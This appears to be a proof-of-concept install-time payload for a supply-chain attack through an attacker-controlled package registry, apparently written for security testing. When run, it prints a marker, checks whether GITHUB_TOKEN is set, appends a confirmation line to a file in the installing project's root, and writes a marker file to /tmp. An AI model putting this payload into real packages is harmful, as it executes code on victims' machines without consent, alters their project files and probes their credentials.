const fs = require('fs');
const path = require('path');
const root = process.env.INIT_CWD || process.cwd();
console.log('RCE_MARKER_OUTPUT');
console.log('GITHUB_TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('INIT_CWD=' + process.env.INIT_CWD + ' CWD=' + process.cwd());
try {
  fs.appendFileSync(path.join(root, 'linter-report.txt'), '\nRCE_CONFIRMED_VIA_ATTACKER_REGISTRY\n');
} catch (e) { console.log('append failed: ' + e.message); }
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed');
